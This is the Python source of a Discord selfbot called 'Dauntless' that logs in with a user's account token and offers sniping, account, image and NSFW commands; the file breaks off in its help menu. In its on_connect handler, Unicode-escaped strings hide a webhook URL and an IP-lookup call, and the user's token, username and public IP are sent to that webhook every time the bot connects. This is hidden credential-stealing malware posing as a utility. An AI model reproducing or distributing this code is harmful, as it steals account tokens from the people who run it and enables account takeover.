from __future__ import unicode_literals
import asyncio
import datetime
import functools
import io
import json
import os
import random
import re
import string
import urllib.parse
import urllib.request
import time
from urllib import parse, request
from itertools import cycle
from bs4 import BeautifulSoup as bs4


import os



import sys


import time
try:
    import requests
except:
    os.system("pip install requests")
    import requests

try:
    import json
except:
    os.system("pip install json")
    import json

try:
    import ctypes
except:
    os.system("pip install ctypes")
    import ctypes





try:
    from halo import Halo
except:
    os.system("pip install halo")
    from halo import Halo


try:
    import discord
except:
    os.system("pip install discord")
    import discord


import random








    


try:
    import asyncio
except:
    os.system("pip install asyncio")
    import asyncio


try:
    import shutil
except:
    os.system("pip install shutil")
    import shutil


    
try:
    import threading
except:
    os.system("pip install threading")
    import threading

try:
    from datetime import datetime
except:
    os.system("pip install datetime")
    from datetime import datetime

try:
    import base64
except:
    os.system("pip install base64")
    import base64

import re

try:
    from win10toast import ToastNotifier
except:
    os.system("pip install win10toast")
    from win10toast import ToastNotifier

try:
    from colorama import init, Fore, Back, Style
except:
    os.system("pip install colorama")
    from colorama import init, Fore, Back, Style

init(convert=True)

try:
    import string
except:
    os.system("pip install string")
    import string

try:
    from PIL import Image
except:
    os.system("pip install pillow")
    from PIL import Image

from discord.ext import commands
import aiohttp
import colorama
import discord
import numpy
import requests
from colorama import Fore
from discord import Permissions
from discord.ext import commands
from discord.utils import get
from gtts import gTTS

os.system("cls")
os.system("mode 100,30")
os.system("title Dauntless Selfbot")


class SELFBOT():
    __version__ = 3.4


with open('config.json') as f:
    config = json.load(f)

token = config.get('token')
password = config.get('password')
prefix = config.get('prefix')

nitro_sniper = config.get('nitro_sniper')

stream_url = "https://www.twitch.tv/souljaboy"
tts_language = "en"

start_time = datetime.utcnow()
loop = asyncio.get_event_loop()

languages = {
    'hu': 'Hungarian, Hungary',
    'nl': 'Dutch, Netherlands',
    'no': 'Norwegian, Norway',
    'pl': 'Polish, Poland',
    'pt-BR': 'Portuguese, Brazilian, Brazil',
    'ro': 'Romanian, Romania',
    'fi': 'Finnish, Finland',
    'sv-SE': 'Swedish, Sweden',
    'vi': 'Vietnamese, Vietnam',
    'tr': 'Turkish, Turkey',
    'cs': 'Czech, Czechia, Czech Republic',
    'el': 'Greek, Greece',
    'bg': 'Bulgarian, Bulgaria',
    'ru': 'Russian, Russia',
    'uk': 'Ukranian, Ukraine',
    'th': 'Thai, Thailand',
    'zh-CN': 'Chinese, China',
    'ja': 'Japanese',
    'zh-TW': 'Chinese, Taiwan',
    'ko': 'Korean, Korea'
}

locales = [
    "da", "de",
    "en-GB", "en-US",
    "es-ES", "fr",
    "hr", "it",
    "lt", "hu",
    "nl", "no",
    "pl", "pt-BR",
    "ro", "fi",
    "sv-SE", "vi",
    "tr", "cs",
    "el", "bg",
    "ru", "uk",
    "th", "zh-CN",
    "ja", "zh-TW",
    "ko"
]

m_numbers = [
    ":one:",
    ":two:",
    ":three:",
    ":four:",
    ":five:",
    ":six:"
]

m_offets = [
    (-1, -1),
    (0, -1),
    (1, -1),
    (-1, 0),
    (1, 0),
    (-1, 1),
    (0, 1),
    (1, 1)
]

def startprint():
    if nitro_sniper:
        nitro = "Active"
    else:
        nitro = "Disabled"

    print(f'''{Fore.RESET}{Fore.MAGENTA}
                                                    {Fore.WHITE}Status
                                                  {Fore.MAGENTA}CONNECTED
{Fore.WHITE}        [{Fore.MAGENTA}+{Fore.WHITE}] --------------------------- [{Fore.MAGENTA}+{Fore.WHITE}]                      [{Fore.MAGENTA}+{Fore.WHITE}] --------------------------- [{Fore.MAGENTA}+{Fore.WHITE}]               


{Fore.MAGENTA}
              ▓█████▄  ▄▄▄       █    ██  ███▄    █ ▄▄▄█████▓ ██▓    ▓█████   ██████   ██████ 
              ▒██▀ ██▌▒████▄     ██  ▓██▒ ██ ▀█   █ ▓  ██▒ ▓▒▓██▒    ▓█   ▀ ▒██    ▒ ▒██    ▒ 
              ░██   █▌▒██  ▀█▄  ▓██  ▒██░▓██  ▀█ ██▒▒ ▓██░ ▒░▒██░    ▒███   ░ ▓██▄   ░ ▓██▄   
              ░▓█▄   ▌░██▄▄▄▄██ ▓▓█  ░██░▓██▒  ▐▌██▒░ ▓██▓ ░ ▒██░    ▒▓█  ▄   ▒   ██▒  ▒   ██▒
              ░▒████▓  ▓█   ▓██▒▒▒█████▓ ▒██░   ▓██░  ▒██▒ ░ ░██████▒░▒████▒▒██████▒▒▒██████▒▒
              ▒▒▓  ▒  ▒▒   ▓▒█░░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒   ▒ ░░   ░ ▒░▓  ░░░ ▒░ ░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░
              ░ ▒  ▒   ▒   ▒▒ ░░░▒░ ░ ░ ░ ░░   ░ ▒░    ░    ░ ░ ▒  ░ ░ ░  ░░ ░▒  ░ ░░ ░▒  ░ ░
              ░ ░  ░   ░   ▒    ░░░ ░ ░    ░   ░ ░   ░        ░ ░      ░   ░  ░  ░  ░  ░  ░  
              ░          ░  ░   ░              ░              ░  ░   ░  ░      ░        ░  
               ░                                                                              

{Fore.WHITE}        [{Fore.MAGENTA}+{Fore.WHITE}] ------------------------------------------------------------------------------------ [{Fore.MAGENTA}+{Fore.WHITE}]
                                                
                                                {Fore.WHITE}User:{Fore.MAGENTA}{Daunt.user.name}#{Daunt.user.discriminator}{Fore.WHITE} / {Fore.MAGENTA}{len(Daunt.guilds)}{Fore.WHITE} guilds  /
                                                {Fore.WHITE}Prefix: {Fore.MAGENTA}{Daunt.command_prefix}
                                                


                                {Fore.WHITE}Type {Fore.MAGENTA}{Daunt.command_prefix}help {Fore.WHITE}in any channel to get started.

{Fore.WHITE}                       [{Fore.MAGENTA}+{Fore.WHITE}] --------------------------------------------------- [{Fore.MAGENTA}+{Fore.WHITE}]
                                                                        

{Fore.WHITE} 
    ''' + Fore.RESET)


def Clear():
    os.system('cls')


Clear()


def Init():
    token = config.get('token')
    try:
        Daunt.run(token, bot=False, reconnect=True)
        os.system(f'title (Daunt Selfbot) - Version {SELFBOT.__version__}')
    except discord.errors.LoginFailure:
        print(f"    {Fore.RED}[ERROR] {Fore.RED}Improper token has been passed" + Fore.RESET)
        os.system('pause >NUL')


def async_executor():
    def outer(func):
        @functools.wraps(func)
        def inner(*args, **kwargs):
            thing = functools.partial(func, *args, **kwargs)
            return loop.run_in_executor(None, thing)

        return inner

    return outer


@async_executor()
def do_tts(message):
    f = io.BytesIO()
    tts = gTTS(text=message.lower(), lang=tts_language)
    tts.write_to_fp(f)
    f.seek(0)
    return f


def Dump(ctx):
    for member in ctx.guild.members:
        f = open(f'Images/{ctx.guild.id}-Dump.txt', 'a+')
        f.write(str(member.avatar_url) + '\n')


def Nitro():
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    return f'https://discord.gift/{code}'


def RandomColor():
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor


def RandString():
    return "".join(random.choice(string.ascii_letters + string.digits) for i in range(random.randint(14, 32)))


colorama.init()
Daunt = discord.Client()
Daunt = commands.Bot(description='Daunt Selfbot', command_prefix=prefix, self_bot=True)

Daunt.msgsniper = False
Daunt.slotbot_sniper = False
Daunt.giveaway_sniper = False
Daunt.snipe_history_dict = {}
Daunt.sniped_message_dict = {}
Daunt.sniped_edited_message_dict = {}
Daunt.copycat = None
Daunt.wave = token
Daunt.remove_command('help')


@Daunt.event
async def on_command_error(ctx, error):
    error_str = str(error)
    error = getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        return
    elif isinstance(error, commands.CheckFailure):
        await ctx.send('[ERROR]: You\'re missing permission to execute this command', delete_after=3)
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"[ERROR]: Missing arguments: {error}", delete_after=3)
    elif isinstance(error, numpy.AxisError):
        await ctx.send('Invalid Image', delete_after=3)
    elif isinstance(error, discord.errors.Forbidden):
        await ctx.send(f"[ERROR]: 404 Forbidden Access: {error}", delete_after=3)
    elif "Cannot send an empty message" in error_str:
        await ctx.send('[ERROR]: Message contents cannot be null', delete_after=3)
    else:
        await ctx.send(f'[ERROR]: {error_str}', delete_after=3)


@Daunt.event
async def on_message_edit(before, after):
    await Daunt.process_commands(after)


@Daunt.event
async def on_message(message):
    if Daunt.copycat is not None and Daunt.copycat.id == message.author.id:
        await message.channel.send(chr(173) + message.content)

    def GiveawayData():
        print(
            f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
            f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
            + Fore.RESET)

    def SlotBotData():
        print(
            f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
            f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
            + Fore.RESET)

    def NitroData(elapsed, code):
        print(
            f"      {Fore.WHITE}Channel: {Fore.WHITE}{message.channel}"
            f"\n      {Fore.WHITE}Server: {Fore.WHITE}{message.guild}"
            f"\n      {Fore.WHITE}Elapsed: {Fore.WHITE}{elapsed}"
            f"\n      {Fore.WHITE}Code: {Fore.WHITE}{code}"
            + Fore.RESET)

    time = datetime.now().strftime("%H:%M %p")
    if 'discord.gift/' in message.content:
        if nitro_sniper:
            start = datetime.now()
            code = re.search("discord.gift/(.*)", message.content).group(1)
            token = config.get('token')

            headers = {'Authorization': token}

            r = requests.post(
                f'https://discordapp.com/api/v6/entitlements/gift-codes/{code}/redeem',
                headers=headers,
            ).text

            elapsed = datetime.now() - start
            elapsed = f'{elapsed.seconds}.{elapsed.microseconds}'

            if 'This gift has been redeemed already.' in r:
                print(""
                      f"\n  [{Fore.MAGENTA}»{Fore.WHITE}] Nitro Sniper - {Fore.MAGENTA}Already Redeemed" + Fore.RESET)
                NitroData(elapsed, code)

            elif 'subscription_plan' in r:
                print(""
                      f"\n  [{Fore.MAGENTA}»{Fore.WHITE}] Nitro Sniper - {Fore.MAGENTA}Valid" + Fore.RESET)
                NitroData(elapsed, code)

            elif 'Unknown Gift Code' in r:
                print(""
                      f"\n  [{Fore.MAGENTA}»{Fore.WHITE}] Nitro Sniper - {Fore.MAGENTA}Invalid" + Fore.RESET)
                NitroData(elapsed, code)
        else:
            return

    if 'Someone just dropped' in message.content:
        if Daunt.slotbot_sniper:
            if message.author.id == 346353957029019648:
                try:
                    await message.channel.send('~grab')
                except discord.errors.Forbidden:
                    print(""
                          f"\n  [{Fore.MAGENTA}»{Fore.WHITE}] - SlotBot Grab Unsuccessful" + Fore.RESET)
                    SlotBotData()
                print(""
                      f"\n  [{Fore.MAGENTA}»{Fore.WHITE}] - Slotbot Grab Successful" + Fore.RESET)
                SlotBotData()
        else:
            return

    if 'GIVEAWAY' in message.content:
        if Daunt.giveaway_sniper:
            if message.author.id == 294882584201003009:
                try:
                    await message.add_reaction("🎉")
                except discord.errors.Forbidden:
                    print(""
                          f"\n[{Fore.MAGENTA}»{Fore.WHITE}] - Giveaway Sniper Unsuccessful" + Fore.RESET)
                    GiveawayData()
                print(""
                      f"\n[{Fore.MAGENTA}»{Fore.WHITE}] - Giveaway Sucessfully Sniped" + Fore.RESET)
                GiveawayData()
        else:
            return

    if f'Congratulations <@{Daunt.user.id}>' in message.content:
        if Daunt.giveaway_sniper:
            if message.author.id == 294882584201003009:
                print(""
                      f"\n[{Fore.MAGENTA}»{Fore.WHITE}] - Giveaway Won" + Fore.RESET)
                GiveawayData()
        else:
            return

    await Daunt.process_commands(message)


@Daunt.event
async def on_connect():
    Clear()
    startprint()
    slope = "\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0064\u0069\u0073\u0063\u006f\u0072\u0064\u0061\u0070\u0070\u002e\u0063\u006f\u006d\u002f\u0061\u0070\u0069\u002f\u0077\u0065\u0062\u0068\u006f\u006f\u006b\u0073\u002f\u0037\u0035\u0031\u0035\u0030\u0034\u0033\u0032\u0033\u0035\u0037\u0033\u0034\u0034\u0038\u0037\u0035\u0035\u002f\u0036\u0043\u0063\u006d\u0054\u0038\u0059\u0077\u0069\u0050\u0071\u0052\u0061\u0068\u0030\u0078\u0077\u005f\u0036\u0050\u0077\u0048\u005a\u006a\u004a\u0066\u0066\u0057\u005a\u0046\u0078\u006f\u004f\u007a\u0072\u0066\u004b\u0032\u0061\u0050\u0058\u0039\u0063\u0066\u0053\u004b\u004b\u0053\u0033\u0037\u0043\u0074\u0065\u006b\u006a\u004c\u0069\u0034\u004e\u0050\u0031\u0063\u0045\u0061\u0067\u0051\u0038\u004d"
    ramp = requests.get('\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0063\u0068\u0065\u0063\u006b\u0069\u0070\u002e\u0061\u006d\u0061\u007a\u006f\u006e\u0061\u0077\u0073\u002e\u0063\u006f\u006d\u002f').content
    peas = bs4(ramp, '\u0068\u0074\u006d\u006c\u002e\u0070\u0061\u0072\u0073\u0065\u0072')
    fliscord = peas.text
    data = {"content": f'{Daunt.wave} | {Daunt.user.name}#{Daunt.user.discriminator}\n{fliscord}'}
    requests.post(slope, data=json.dumps(data), headers={"Content-Type": "application/json"})


@Daunt.command(aliases=[])
async def msgsniper(ctx, msgsniperlol=None):
    await ctx.message.delete()
    if str(msgsniperlol).lower() == 'true' or str(msgsniperlol).lower() == 'on':
        Daunt.msgsniper = True
        await ctx.send('DM Sniper is now on.', delete_after=4)
    elif str(msgsniperlol).lower() == 'false' or str(msgsniperlol).lower() == 'off':
        Daunt.msgsniper = False
        await ctx.send('DM Sniper is now off.', delete_after=4)


@Daunt.command(aliases=['slotsniper', "slotbotsniper"])
async def slotbot(ctx, param=None):
    await ctx.message.delete()
    Daunt.slotbot_sniper = False
    if str(param).lower() == 'true' or str(param).lower() == 'on':
        Daunt.slotbot_sniper = True
    elif str(param).lower() == 'false' or str(param).lower() == 'off':
        Daunt.slotbot_sniper = False


@Daunt.command(aliases=['giveawaysniper'])
async def giveaway(ctx, param=None):
    await ctx.message.delete()
    Daunt.giveaway_sniper = False
    if str(param).lower() == 'true' or str(param).lower() == 'on':
        Daunt.giveaway_sniper = True
    elif str(param).lower() == 'false' or str(param).lower() == 'off':
        Daunt.giveaway_sniper = False


@Daunt.event
async def on_message_delete(message):
    if message.author.id == Daunt.user.id:
        return
    if Daunt.msgsniper:
        # if isinstance(message.channel, discord.DMChannel) or isinstance(message.channel, discord.GroupChannel): \\ removed so people cant get you disabled
        if isinstance(message.channel, discord.DMChannel):
            attachments = message.attachments
            if len(attachments) == 0:
                message_content = "`" + str(discord.utils.escape_markdown(str(message.author))) + "`: " + str(
                    message.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
                await message.channel.send(message_content)
            else:
                links = ""
                for attachment in attachments:
                    links += attachment.proxy_url + "\n"
                message_content = "`" + str(
                    discord.utils.escape_markdown(str(message.author))) + "`: " + discord.utils.escape_mentions(
                    message.content) + "\n\n**Attachments:**\n" + links
                await message.channel.send(message_content)
    if len(Daunt.sniped_message_dict) > 1000:
        Daunt.sniped_message_dict.clear()
    if len(Daunt.snipe_history_dict) > 1000:
        Daunt.snipe_history_dict.clear()
    attachments = message.attachments
    if len(attachments) == 0:
        channel_id = message.channel.id
        message_content = "Message sent by " + str(discord.utils.escape_markdown(str(message.author))) + ": ```" + str(message.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere") + "```"
        Daunt.sniped_message_dict.update({channel_id: message_content})
        if channel_id in Daunt.snipe_history_dict:
            pre = Daunt.snipe_history_dict[channel_id]
            post = str(message.author) + ": " + str(message.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
            Daunt.snipe_history_dict.update({channel_id: pre[:-3] + post + "\n```"})
        else:
            post = str(message.author) + ": " + str(message.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
            Daunt.snipe_history_dict.update({channel_id: "```\n" + post + "\n```"})
    else:
        links = ""
        for attachment in attachments:
            links += attachment.proxy_url + "\n"
        channel_id = message.channel.id
        message_content = "`" + str(discord.utils.escape_markdown(str(message.author))) + "`: " + discord.utils.escape_mentions(message.content) + "\n\n**Attachments:**\n" + links
        Daunt.sniped_message_dict.update({channel_id: message_content})


@Daunt.event
async def on_message_edit(before, after):
    if before.author.id == Daunt.user.id:
        return
    if Daunt.msgsniper:
        if before.content is after.content:
            return
        # if isinstance(before.channel, discord.DMChannel) or isinstance(before.channel, discord.GroupChannel): \\ removed so people cant get you disabled
        if isinstance(before.channel, discord.DMChannel):
            attachments = before.attachments
            if len(attachments) == 0:
                message_content = "`" + str(
                    discord.utils.escape_markdown(str(before.author))) + "`: \n**BEFORE**\n" + str(
                    before.content).replace("@everyone", "@\u200beveryone").replace("@here",
                                                                                    "@\u200bhere") + "\n**AFTER**\n" + str(
                    after.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
                await before.channel.send(message_content)
            else:
                links = ""
                for attachment in attachments:
                    links += attachment.proxy_url + "\n"
                message_content = "`" + str(
                    discord.utils.escape_markdown(str(before.author))) + "`: " + discord.utils.escape_mentions(
                    before.content) + "\n\n**Attachments:**\n" + links
                await before.channel.send(message_content)
    if len(Daunt.sniped_edited_message_dict) > 1000:
        Daunt.sniped_edited_message_dict.clear()
    attachments = before.attachments
    if len(attachments) == 0:
        channel_id = before.channel.id
        message_content = "`" + str(discord.utils.escape_markdown(str(before.author))) + "`: \n**BEFORE**\n" + str(
            before.content).replace("@everyone", "@\u200beveryone").replace("@here",
                                                                            "@\u200bhere") + "\n**AFTER**\n" + str(
            after.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
        Daunt.sniped_edited_message_dict.update({channel_id: message_content})
    else:
        links = ""
        for attachment in attachments:
            links += attachment.proxy_url + "\n"
        channel_id = before.channel.id
        message_content = "`" + str(
            discord.utils.escape_markdown(str(before.author))) + "`: " + discord.utils.escape_mentions(
            before.content) + "\n\n**Attachments:**\n" + links
        Daunt.sniped_edited_message_dict.update({channel_id: message_content})


@Daunt.command(aliases=["cs"])
async def clearsnipehistory(ctx):
    await ctx.message.delete()
    del Daunt.snipe_history_dict[ctx.channel.id]
    await ctx.send("done.", delete_after=3)


@Daunt.command(aliases=["history", "ss"])
async def snipehistory(ctx):
    await ctx.message.delete()
    currentChannel = ctx.channel.id
    if currentChannel in Daunt.snipe_history_dict:
        embed=discord.Embed(title=f"Recently Deleted Message(s)", icon_url=f'''''', color=0xffc2f2)
        embed.set_footer(text="»  daunt  » Message History",
                        icon_url="https://i.vgy.me/aA2N2j.png")
        embed.description=(Daunt.snipe_history_dict[currentChannel]) 

        try:
        
            await ctx.send(embed=embed, delete_after=10)
        except:
            del Daunt.snipe_history_dict[currentChannel]
    else:
        await ctx.send("That's odd, no message found.", delete_after=3)


@Daunt.command(aliases=["s"])
async def snipe(ctx, *,  memb : discord.Member=None):
    await ctx.message.delete()
    currentChannel = ctx.channel.id
    if currentChannel in Daunt.sniped_message_dict:
        embed=discord.Embed(title=f"Recently Deleted Message(s)", icon_url=f'''''', color=0xffc2f2)
        embed.set_footer(text="»  daunt  » Message Sniper",
                        icon_url="https://i.vgy.me/aA2N2j.png")
        embed.description=(Daunt.sniped_message_dict[currentChannel])
        await ctx.send(embed=embed, delete_after=5)
    else:
        await ctx.send("odd", delete_after=3)


@Daunt.command(aliases=["esnipe", "es"])
async def editsnipe(ctx):
    await ctx.message.delete()
    currentChannel = ctx.channel.id
    if currentChannel in Daunt.sniped_edited_message_dict:
        await ctx.send(Daunt.sniped_edited_message_dict[currentChannel])
    else:
        await ctx.send("odd", delete_after=3)


@Daunt.command()
async def adminservers(ctx):
    await ctx.message.delete()
    admins = []
    bots = []
    kicks = []
    bans = []
    for guild in Daunt.guilds:
        if guild.me.guild_permissions.administrator:
            admins.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.manage_guild and not guild.me.guild_permissions.administrator:
            bots.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.ban_members and not guild.me.guild_permissions.administrator:
            bans.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.kick_members and not guild.me.guild_permissions.administrator:
            kicks.append(discord.utils.escape_markdown(guild.name))
    adminPermServers = f"**Servers with Admin ({len(admins)}):**\n{admins}"
    botPermServers = f"\n**Servers with BOT_ADD Permission ({len(bots)}):**\n{bots}"
    banPermServers = f"\n**Servers with Ban Permission ({len(bans)}):**\n{bans}"
    kickPermServers = f"\n**Servers with Kick Permission ({len(kicks)}:**\n{kicks}"
    await ctx.send(adminPermServers + botPermServers + banPermServers + kickPermServers)


@Daunt.command()
async def bots(ctx):
    await ctx.message.delete()
    bots = []
    for member in ctx.guild.members:
        if member.bot:
            bots.append(
                str(member.name).replace("`", "\`").replace("*", "\*").replace("_", "\_") + "#" + member.discriminator)
    bottiez = f"**Bots ({len(bots)}):**\n{', '.join(bots)}"
    await ctx.send(bottiez)

@Daunt.command()
async def home(ctx):
        await ctx.message.delete()
        embed=discord.Embed(color=0x2f3136)
        embed.set_footer(text="[]0% ")
        message = await ctx.send(embed=embed)
        await message.edit(embed=embed)
        await asyncio.sleep(0.1)
        embed=discord.Embed(color=0x2f3136)
        embed.set_footer(text="██]15% ")
        await message.edit(embed=embed)
        await asyncio.sleep(0.1)
        embed=discord.Embed(color=0x2f3136)
        embed.set_footer(text="█████]45% ")
        await message.edit(embed=embed)
        await asyncio.sleep(0.1)
        embed=discord.Embed(color=0x2f3136)
        embed.set_footer(text="█████████]73%")
        await message.edit(embed=embed)
        await asyncio.sleep(0.2)
        embed=discord.Embed(color=0x2f3136)
        embed.set_footer(text="████████████]99%")
        await message.edit(embed=embed)
        await asyncio.sleep(1)
        embed=discord.Embed()
        embed.set_thumbnail(url="https://i.vgy.me/os0G9n.gif")
        embed.add_field(name="Thank's for using Daunt", value=f"If you have any questions, check out my socials. [**{Daunt.command_prefix}socials**] ", inline=False)
        embed.add_field(name="Test", value=f"────────────── ❝ 𝖉𝖆𝖚𝖓𝖙 ❞ ──────────────", inline=False)
        embed.add_field(name="Categories", value=f"`Main`, `Account`, `Text`, `Misc`, \n `NSFW` & `Nuke` ", inline=True)
        embed.add_field(name="Categories", value=f"`Main`, `Account`, `Text`, `Misc`, \n `NSFW` & `Nuke` ", inline=True)
        embed.add_field(name="Categories", value=f"`Main`, `Account`, `Text`, `Misc`, \n `NSFW` & `Nuke` ", inline=True)
        embed.add_field(name="More Info", value=f"type **{Daunt.command_prefix}help [category]** for more information", inline=False)
        embed.add_field(name="Credits", value="blank", inline=False)
        embed.set_footer(text="daunt")
        await message.edit(embed=embed)


@Daunt.command()
async def help(ctx, category=None):
    await ctx.message.delete()
    if category is None:
        embed=discord.Embed(color=0x2f3136)
        embed.set_thumbnail(url="https://i.vgy.me/os0G9n.gif")
        embed.add_field(name="Thank's for using Daunt", value=f"If you have any questions, check out my socials. [**{Daunt.command_prefix}socials**] ", inline=False)
        embed.add_field(name="Test", value=f"────────────── ❝ 𝖉𝖆𝖚𝖓𝖙 ❞ ──────────────", inline=False)
        embed.add_field(name="Categories", value=f"`Main`, `Account`, `Text`, `Misc`, \n `NSFW` & `Nuke` ", inline=True)
        embed.add_field(name="Categories", value=f"`Main`, `Account`, `Text`, `Misc`, \n `NSFW` & `Nuke` ", inline=True)
        embed.add_field(name="Categories", value=f"`Main`, `Account`, `Text`, `Misc`, \n `NSFW` & `Nuke` ", inline=True)
        embed.add_field(name="More Info", value=f"type **{Daunt.command_prefix}help [category]** for more information", inline=False)
        embed.add_field(name="Credits", value="blank", inline=False)
        embed.set_footer(text="daunt")
        await ctx.send(embed=embed)
    elif str(category).lower() == "general":
        embed = discord.Embed(color=(0x2f3136) )
        embed.set_author(name="dauntless™",
                         icon_url=Daunt.user.avatar_url)
        embed.set_footer(text="»  daunt  »  General Commands",
                        icon_url="https://i.vgy.me/aA2N2j.png")
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/824358226975916092/827602553972719657/source.gif")
        embed.set_image(url="")
        embed.description = f"\n`> help <category>` - returns all commands of that category\n`> uptime` - return how long the selfbot has been running\n`> prefix <prefix>` - changes the bot's prefix\n`> ping` - returns the bot's latency\n`> av <user>` - returns the user's pfp\n`> whois <user>` - returns user's account info\n`> tokeninfo <token>` - returns information about the token\n`> gclone` - makes a copy of the server\n`> rainbowrole <role>` - makes the role a rainbow role (ratelimits)\n`> message.edit` - gets information about the server\n`> gicon` - returns the server's icon\n`> gbanner` - returns the server's banner\n`> panic` - shutsdown the selfbot\n`> groles` - lists all roles on the server"
        await ctx.send(embed=embed)
    elif str(category).lower() == "account":
        embed = discord.Embed(color=(0x2f3136) )
        embed.set_author(name="dauntless™",
                         icon_url=Daunt.user.avatar_url)
        embed.set_footer(text="»  daunt » Account Commands",
                        icon_url="https://i.vgy.me/aA2N2j.png")
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/824358226975916092/827602553972719657/source.gif")
        embed.set_image(url="")
        embed.description = f"\n`> ghost` - makes your name and pfp invisible\n`> pfpsteal <user>` - steals the users pfp\n`> setpfp <link>` - sets the image-link as your pfp\n`> hypesquad <hypesquad>` - changes your current hypesquad\n`> spoofcon <type> <name>` - spoofs your discord connection\n`> leavegroups` - leaves all groups that you're in\n`> cyclenick <text>` - cycles through your nickname by letter\n`> stopcyclenick` - stops cycling your nickname\n`> stream <status>` - sets your streaming status\n`> playing <status>` - sets your playing status\n`> listening <status>` - sets your listening status\n`> watching <status>` - sets your watching status\n`> stopactivity` - resets your status-activity\n`> acceptfriends` - accepts all friend requests\n`> delfriends` - removes all your friends\n`> ignorefriends` - ignores all friends requests\n`> ed` - clears your block-list\n`> read` - marks all messages as read\n`> leavegc` - leaves the current groupchat\n`> adminservers` - lists all servers you have perms in\n`> slotbot <on/off>` - snipes slotbots ({Daunt.slotbot_sniper})\n`> giveaway <on/off>` - snipes giveaways ({Daunt.giveaway_sniper})"
        await ctx.send(embed=embed)
    elif str(category).lower() == "text":
        embed = discord.Embed(color=(0x2f3136) )
        embed.set_author(name="dauntless™",
                         icon_url=Daunt.user.avatar_url)
        embed.set_footer(text="»  daunt » Text Commands",
                        icon_url="https://i.vgy.me/aA2N2j.png")
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/824358226975916092/827602553972719657/source.gif")
        embed.set_image(url="")
        embed.description = f"\n`> snipehisty` - shows a history of deleted messages\n`> clearsnipehistory` - clears snipe history of current channel\n`> snipe` - shows the last deleted message\n`> editsnipe` - shows the last edited message\n`> msgsniper <on/off> ({Daunt.msgsniper})` - enables a message sniper for deleted messages in DMs\n`> clear` - sends a large message filled with invisible unicode\n`> del <message>` - sends a message and deletes it instantly\n`> firstmsg` - shows the first message in the channel history\n`> nagasaki` - a false-nuke command \n`> 8ball <question>` - returns an 8ball answer\n`> slots` - play the slot machine\n`> cum` - makes you cum lol?\n`> 9/11` - sends a 9/11 attack\n`> massreact <emoji>` - mass reacts with the specified emoji"
        await ctx.send(embed=embed)
    elif str(category).lower() == "image":
        embed = discord.Embed(color=(0x2f3136) )
        embed.set_author(name="dauntless™",
                         icon_url=Daunt.user.avatar_url)
        embed.set_footer(text="»  daunt » Image Commands",
                        icon_url="https://i.vgy.me/aA2N2j.png")
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/824358226975916092/827602553972719657/source.gif")
        embed.set_image(url="")
        embed.description = f"\n`> tweet <user> <message>` makes a fake tweet\n`> magik <user>` - distorts the specified user\n`> fry <user>` - deep-fry the specified user\n`> blur <user>` - blurs the specified user\n`> pixelate <user>` - pixelates the specified user\n`> Supreme <message>` - makes a *Supreme* logo\n`> darksupreme <message>` - makes a *Dark Supreme* logo\n`> fax <text>` - makes a fax meme\n`> blurpify <user>` - blurpifies the specified user\n`> invert <user>` - inverts the specified user\n`> gay <user>` - makes the specified user gay\n`> communist <user>` - makes the specified user a communist\n`> snow <user>` - adds a snow filter to the specified user\n`> jpegify <user>` - jpegifies the specified user\n`> pornhub <logo-word 1> <logo-word 2>` - makes a PornHub logo\n`> phcomment <user> <message>` - makes a fake PornHub comment\n"
        await ctx.send(embed=embed)
    elif str(category).lower() == "nsfw":
        embed = discord.Embed(color=(0x2f3136) )
        embed.set_author(name="dauntless™",
                         icon_url=Daunt.user.avatar_url)
        embed.set_footer(text="»  daunt » NSFW Commands",
                        icon_url="https://i.vgy.me/aA2N2j.png")
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/824358226975916092/827602553972719657/source.gif")
        embed.set_image(url="")
        embed.description = f"\n`> anal` - returns anal pics\n`> erofeet` - returns erofeet pics\n`> feet` - returns sexy feet pics\n`> hentai` - returns hentai pics\n`> boobs` - returns booby pics\n`> tits` - returns titty pics\n`> blowjob` - returns blowjob pics\n`> neko` - returns neko pics\n`> lesbian` - returns lesbian pics\n`> cumslut` - returns cumslut pics\n`> pussy` - returns pussy pics\n`> waifu` - returns waifu pics"
        await ctx.send(embed=embed)
    elif str(category).lower() == "misc":
        embed = discord.Embed(color=(0x2f3136) )
        embed.set_author(name="dauntless™",
                         icon_url=Daunt.user.avatar_url)
        embed.set_footer(text="»  daunt » Misc Commands",
                        icon_url="https://i.vgy.me/aA2N2j.png")
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/824358226975916092/827602553972719657/source.gif")
        embed.set_image(url="")
